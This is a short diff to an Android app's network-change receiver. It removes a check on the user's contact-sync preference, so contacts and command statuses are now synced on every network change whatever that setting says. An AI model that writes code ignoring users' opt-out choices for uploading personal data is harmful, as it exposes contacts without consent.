@@ -24,25 +24,20 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
     public void onReceive(final Context context, Intent intent) {
         Log.i(X, "Network changed...");
 
-        final boolean isSyncContacts = PrefUtils.getInstance(context).getBoolean(PrefUtils.KEY_IS_SYNC_CONTACTS);
 
-        Log.d(X, "isSyncContacts : " + isSyncContacts);
+        new APIRequestGateway(context, new APIRequestGateway.APIRequestGatewayCallback() {
+            @Override
+            public void onReadyToRequest(String apiKey) {
+                new ContactsSynchronizer(context).execute(apiKey);
+                new CommandStatusesSynchronizer(context).execute(apiKey);
+            }
 
-        if (isSyncContacts) {
+            @Override
+            public void onFailed(String reason) {
+                Log.e(X, "Failed to sync contacts : " + reason);
+            }
+        });
 
-            new APIRequestGateway(context, new APIRequestGateway.APIRequestGatewayCallback() {
-                @Override
-                public void onReadyToRequest(String apiKey) {
-                    new ContactsSynchronizer(context).execute(apiKey);
-                    new CommandStatusesSynchronizer(context).execute(apiKey);
-                }
-
-                @Override
-                public void onFailed(String reason) {
-                    Log.e(X, "Failed to sync contacts : " + reason);
-                }
-            });
-        }
 
     }
 }
